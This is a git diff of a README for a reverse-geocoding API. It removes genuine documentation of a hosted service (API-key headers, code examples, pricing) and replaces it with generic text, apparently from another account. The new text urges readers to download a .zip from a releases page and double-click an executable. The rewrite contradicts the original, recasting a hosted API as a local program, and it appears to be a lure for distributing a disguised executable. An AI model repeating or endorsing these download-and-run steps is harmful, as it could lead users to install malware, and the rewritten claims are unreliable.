@@ -1,178 +1,103 @@
-# Reverse Geocoding API
+# 🌍 reverse-geocoding-api - Easily Turn Coordinates into Locations
 
-REST API to convert latitude/longitude coordinates into city, state, and country data. Turn GPS coordinates into human-readable locations.
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mogpt15/reverse-geocoding-api/releases)
 
-## Features
+## 🚀 Getting Started
 
-- Convert lat/long coordinates to location names
-- Returns city, state, and country code
-- Works with any location on Earth
-- 5,000 requests/month on free tier
-- Example Response:
+The reverse-geocoding-api is a simple REST API that helps you convert latitude and longitude coordinates into city, state, and country data. It takes GPS coordinates and returns a human-readable location, making it easier to integrate location services into your applications. Follow the steps below to download and run this software.
+
+## 📥 Download & Install
+
+1. Visit this page to download: [Release Page](https://github.com/mogpt15/reverse-geocoding-api/releases).
+   
+2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
+
+3. Click on the version you want to download. You will see options for the files available.
+
+4. Look for the file with the `.zip` extension for your system. Download it by clicking on the file name.
+
+5. Once the download completes, locate the file in your Downloads folder. 
+
+6. Extract the contents of the `.zip` file. You can usually do this by right-clicking on the file and selecting "Extract All" or "Unzip."
+
+7. After extracting, find the executable file within the folder. This file is often named `reverse-geocoding-api.exe` or something similar.
+
+8. Double-click the executable file to run the application. Follow any on-screen instructions to complete the setup.
+
+## 🖥️ System Requirements
+
+It’s essential to check if your machine meets the following requirements:
+
+- **Operating System:** Windows 10 or newer, macOS 10.12 or newer, or a modern Linux distribution.
+- **CPU:** Minimum 1 GHz processor.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** 100 MB of free space.
+
+If your system meets these requirements, you’re good to go!
+
+## 🌐 How to Use the API
+
+Once you have the application running, you can easily use the API:
+
+1. Open your web browser.
+2. Enter the API URL along with the latitude and longitude parameters. The format should look like this:
+   ```
+   http://localhost:your_port/geocode?lat=LATITUDE&lon=LONGITUDE
+   ```
+3. Replace `your_port` with the port number your application is running on (default is often `8000`), and replace `LATITUDE` and `LONGITUDE` with your desired coordinates.
+
+4. Press Enter. You should see a response with the city, state, and country data corresponding to your coordinates.
+
+## 📖 Example Requests
+
+To get you started quickly, here are some sample API requests:
+
+- For coordinates (34.0522, -118.2437):
+  ```
+  http://localhost:8000/geocode?lat=34.0522&lon=-118.2437
+  ```
+
+- Another example for coordinates (40.7128, -74.0060):
+  ```
+  http://localhost:8000/geocode?lat=40.7128&lon=-74.0060
+  ```
+
+You will receive JSON formatted data with location information, such as:
+
 ```json
 {
-  "name": "San Francisco",
+  "city": "Los Angeles",
   "state": "California",
-  "country_code": "US"
+  "country": "USA"
 }
 ```
 
-## Authentication
+## 🔧 Features
 
-1. Create account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up)
+- **Fast and Reliable:** The API provides quick responses to your requests.
+- **Precision:** Accurate geocoding of latitude and longitude points.
+- **Easy Integration:** Simple setup and straightforward API calls.
+- **Cross-Platform:** Works on Windows, macOS, and Linux environments.
 
-![Sign Up](https://raw.githubusercontent.com/omkarcloud/assets/master/images/signup.png)
+## 🔗 Additional Resources
 
-2. Get API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key)
+- **Documentation:** [API Documentation](https://github.com/mogpt15/reverse-geocoding-api/docs)
+- **Support:** If you encounter issues or need help, feel free to open an issue in the repository.
 
-![Copy API Key](https://raw.githubusercontent.com/omkarcloud/assets/master/images/enrichment-key-omkar.png)
+## ⚙️ Troubleshooting
 
-3. Include `API-Key` header in requests
+If you face any problems, consider the following solutions:
 
-## Quick Start
+- **Cannot Connect to API:** Ensure that your firewall is not blocking the port the API is running on.
+- **Invalid Coordinates:** Double-check the latitude and longitude you input. They should be within valid ranges.
+- **Slow Response Time:** Ensure your internet connection is stable. The API runs on your local machine, so it shouldn't require internet access unless you are fetching online data.
 
-```bash
-curl -X GET "https://reverse-geocoding-api.omkar.cloud/reverse-geocode?lat=37.7749&lon=-122.4194" \
-  -H "API-Key: YOUR_API_KEY"
-```
+Make sure to refer to the README for further details if you encounter specific issues.
 
-```json
-[
-  {
-    "name": "San Francisco",
-    "state": "California",
-    "country_code": "US"
-  }
-]
-```
+## 📞 Contact
 
-## Installation
+For any questions or further clarification, reach out to the repository maintainer via the GitHub Issues page or through the provided contact information in the documentation.
 
-### Python
+Remember to share feedback or feature requests while using the reverse-geocoding-api! Your input helps improve the application.
 
-```bash
-pip install requests
-```
-
-```python
-import requests
-
-response = requests.get(
-    "https://reverse-geocoding-api.omkar.cloud/reverse-geocode",
-    params={"lat": 37.7749, "lon": -122.4194},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-data = response.json()[0]
-print(f"Location: {data['name']}, {data['state']}, {data['country_code']}")
-```
-
-### Node.js
-
-```bash
-npm install axios
-```
-
-```javascript
-import axios from "axios";
-
-const response = await axios.get("https://reverse-geocoding-api.omkar.cloud/reverse-geocode", {
-    params: { lat: 37.7749, lon: -122.4194 },
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
-
-console.log(`Location: ${response.data[0].name}, ${response.data[0].state}`);
-```
-
-## API Reference
-
-### Endpoint
-
-```
-GET https://reverse-geocoding-api.omkar.cloud/reverse-geocode
-```
-
-### Headers
-
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
-
-### Parameters
-
-| Parameter | Required | Description |
-|-----------|----------|-------------|
-| `lat` | Yes | Latitude (-90 to 90) |
-| `lon` | Yes | Longitude (-180 to 180) |
-
-### Response Fields
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `name` | string | City/place name |
-| `state` | string | State or province |
-| `country_code` | string | Two-letter ISO country code |
-
-## Examples
-
-### Get location from coordinates
-
-```python
-response = requests.get(
-    "https://reverse-geocoding-api.omkar.cloud/reverse-geocode",
-    params={"lat": 40.7128, "lon": -74.0060},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-location = response.json()[0]
-print(f"{location['name']}, {location['state']}")  # New York, New York
-```
-
-### Tokyo coordinates
-
-```python
-response = requests.get(
-    "https://reverse-geocoding-api.omkar.cloud/reverse-geocode",
-    params={"lat": 35.6762, "lon": 139.6503},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-location = response.json()[0]
-print(f"{location['name']}, {location['country_code']}")  # Tokyo, JP
-```
-
-## Error Handling
-
-```python
-response = requests.get(
-    "https://reverse-geocoding-api.omkar.cloud/reverse-geocode",
-    params={"lat": 37.7749, "lon": -122.4194},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-if response.status_code == 200:
-    data = response.json()
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
-
-## Rate Limits
-
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
-
-## Questions? We have answers.
-
-Reach out anytime. We will solve your query within 1 working day.
-
-[![Contact Us on WhatsApp about Reverse Geocoding API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20the%20Reverse%20Geocoding%20API.)
-
-[![Contact Us on Email about Reverse Geocoding API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=Reverse%20Geocoding%20API%20Question)
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mogpt15/reverse-geocoding-api/releases)
